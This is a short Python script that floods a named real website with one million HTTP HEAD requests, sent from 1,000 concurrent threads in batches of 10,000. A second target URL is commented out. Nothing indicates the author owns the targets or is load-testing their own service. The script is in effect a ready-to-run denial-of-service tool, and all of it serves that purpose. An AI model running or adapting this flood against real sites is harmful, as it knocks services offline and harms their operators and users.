import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# url = "https://www.surberrordutyun.com"
url = "https://nataliweb.innodream.com/"
total_requests = 1000000
batch_size = 10000  # Number of requests to send per batch
threads = 1000  # Number of concurrent threads per batch

def send_request(index):
    try:
        response = requests.head(url)
        return f"Request {index}: Status Code {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Request {index}: Failed - {e}"

def execute_batch(start_index, end_index):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(send_request, i): i for i in range(start_index, end_index)}
        for future in as_completed(futures):
            print(future.result())

current_index = 1
while current_index <= total_requests:
    next_index = min(current_index + batch_size, total_requests + 1)
    execute_batch(current_index, next_index)
    current_index = next_index
    
    time.sleep(0.5)  # Adjust delay as needed

print("Finished sending requests.")